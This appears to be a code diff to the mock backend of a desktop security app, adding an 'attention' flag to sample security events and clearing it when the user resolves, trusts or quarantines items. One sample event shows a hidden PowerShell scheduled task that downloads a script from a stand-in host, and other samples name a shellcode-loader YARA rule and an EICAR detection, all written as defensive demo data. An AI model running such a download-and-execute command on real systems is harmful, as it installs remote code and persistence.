@@ -83,7 +83,7 @@ let quarantine: QuarantineItem[] = [
   },
 ];
 
-const events: SecurityEvent[] = [
+const rawEvents: Omit<SecurityEvent, "attention">[] = [
   { id: 9, timestamp: now() - 540, kind: "threat_detected", severity: "medium", title: "YARA.COD3NYM_SUSP_NET_Shellcode_Loader_Indicators_Jan24: suspicious file left in place", detail: "Found by on-demand scan: YARA rule yara_forge_core:COD3NYM_SUSP_NET_Shellcode_Loader_Indicators_Jan24 (Detects indicators of shellcode loaders in .NET binaries), score 65. Not quarantined automatically because the rule's confidence score (65) is below the quarantine threshold (75). Review it, quarantine it with a manual scan if confirmed, or add an exclusion if it is safe.", path: "C:\\Program Files\\WindowsApps\\Clipchamp.Clipchamp_4.3.10120.0_x64__yxz26nhyzhsrt\\Clipchamp.Widgets\\Clipchamp.Widgets.exe", pid: null },
   { id: 8, timestamp: now() - 420, kind: "device_access", severity: "low", title: "Camera turned on by Zoom.exe", detail: "Zoom.exe started using your camera.", path: "C:\\Users\\alex\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe", pid: null },
   { id: 7, timestamp: now() - 200, kind: "persistence_change", severity: "high", title: "New scheduled task", detail: "Runs: \"powershell.exe\" -WindowStyle Hidden -Command iwr https://x.example/a.ps1. Red flags: runs a script host / system tool often abused by malware; hidden or encoded PowerShell; downloads from the internet. If you did not install something that needs this, disable it.", path: "\\WindowsUpdateHelper", pid: null },
@@ -94,6 +94,9 @@ const events: SecurityEvent[] = [
   { id: 2, timestamp: now() - 5401, kind: "threat_detected", severity: "high", title: "EICAR-Test-File detected", detail: "Found by File Shield", path: quarantine[0].original_path, pid: null },
   { id: 1, timestamp: now() - 7200, kind: "service_info", severity: "info", title: "Vigil engine started", detail: "2 signatures loaded", path: null, pid: null },
 ];
+// Open items in the mock: the suspicious file, the risky task, the blocked program, the frozen process.
+const OPEN = new Set([9, 7, 6, 5]);
+const events: SecurityEvent[] = rawEvents.map((e) => ({ ...e, attention: OPEN.has(e.id) }));
 
 const scan = {
   scan_id: 0, running: false, kind: null as ScanKind | null, files_scanned: 0, bytes_scanned: 0,
@@ -101,8 +104,8 @@ const scan = {
 };
 let timer: ReturnType<typeof setInterval> | undefined;
 
-function push(e: Omit<SecurityEvent, "id" | "timestamp">) {
-  const ev = { ...e, id: nextId++, timestamp: now() };
+function push(e: Omit<SecurityEvent, "id" | "timestamp" | "attention">) {
+  const ev = { ...e, id: nextId++, timestamp: now(), attention: false };
   events.unshift(ev);
   listeners.forEach((l) => l(ev));
 }
@@ -111,7 +114,11 @@ function status(): EngineStatus {
   return {
     protocol_version: 1,
     service_version: "0.1.0-mock",
-    state: settings.realtime_protection ? "protected" : { at_risk: { reasons: ["Real-time protection is turned off"] } },
+    state: !settings.realtime_protection
+      ? { at_risk: { reasons: ["Real-time protection is turned off"] } }
+      : events.some((e) => e.attention && ["threat_detected", "process_suspended", "behavior_alert", "scan_error"].includes(e.kind))
+        ? "threat_detected"
+        : "protected",
     realtime_enabled: settings.realtime_protection,
     shields: [
       { name: "Process Guard", enabled: settings.process_monitor, running: settings.realtime_protection && settings.process_monitor, detail: "ETW: Microsoft-Windows-Kernel-Process" },
@@ -136,6 +143,7 @@ function status(): EngineStatus {
     network_blocked_ranges: settings.network_guard ? 1489 : 0,
     build: 14,
     app_update_status: appUpdate,
+    attention_count: events.filter((e) => e.attention).length,
     devices_in_use: settings.privacy_monitor ? devices.filter((d) => d.in_use) : [],
     last_snapshot: snapshots.filter((s) => s.ours)[0]?.created_at ?? null,
     snapshot_error: null,
@@ -191,8 +199,11 @@ export const mock = {
         case "get_status": return status();
         case "start_scan": return startScan(args.kind as ScanKind);
         case "cancel_scan": return scan.running ? finishScan(true) : undefined;
-        case "acknowledge_threats": return undefined;
+        case "acknowledge_threats":
+          events.forEach((e) => (e.attention = false));
+          return undefined;
         case "trust_app":
+          events.forEach((e) => { if (e.path === args.path) e.attention = false; });
           settings.trusted_apps = [...settings.trusted_apps, { path: args.path as string, sha256: "ab".repeat(32) }];
           return undefined;
         case "inspect_paths":
@@ -201,6 +212,7 @@ export const mock = {
             reports: (args.paths as string[]).map((path) => mockReport(path)),
           };
         case "quarantine_path":
+          events.forEach((e) => { if (e.path === args.path) e.attention = false; });
           quarantine = [...quarantine, { id: Math.random().toString(16).slice(2), original_path: args.path as string, sha256: "cd".repeat(32), threat_name: (args.threatName as string) ?? "Manual.UserQuarantine", size: 1024, quarantined_at: now() }];
           return undefined;
         case "pick_files":
@@ -217,6 +229,7 @@ export const mock = {
           lsaOn = true;
           return undefined;
         case "process_action":
+          events.forEach((e) => { if (e.pid === args.pid) e.attention = false; });
           push({ kind: args.action === "terminate" ? "process_blocked" : "service_info", severity: "high", title: args.action === "terminate" ? "Process terminated by user" : "Process resumed by user", detail: null, path: null, pid: args.pid as number });
           return undefined;
         case "update_signatures":
@@ -228,6 +241,7 @@ export const mock = {
           }, 1500);
           return undefined;
         case "disable_task":
+          events.forEach((e) => { if (e.path === args.name) e.attention = false; });
           push({ kind: "persistence_change", severity: "info", title: "Scheduled task disabled", detail: `${args.name} will no longer run.`, path: null, pid: null });
           return undefined;
         case "get_device_usage": return devices;
@@ -243,6 +257,16 @@ export const mock = {
           push({ kind: "recovery", severity: "info", title: `Restored ${paths.length} file(s) from the snapshot`, detail: "The versions they replaced were moved to C:\\Users\\alex\\Vigil Restore Backup.", path: null, pid: null });
           return undefined;
         }
+        case "get_attention": return events.filter((e) => e.attention);
+        case "resolve_event": {
+          const ev = events.find((e) => e.id === args.id);
+          if (ev) ev.attention = false;
+          return undefined;
+        }
+        case "allow_file":
+          events.forEach((e) => { if (e.path === args.path) e.attention = false; });
+          push({ kind: "settings_changed", severity: "medium", title: "File marked as safe", detail: "This exact file will not be reported again.", path: args.path as string, pid: null });
+          return undefined;
         case "get_events": return events.slice(0, (args.limit as number) ?? 100);
         case "list_quarantine": return quarantine;
         case "restore_quarantine":
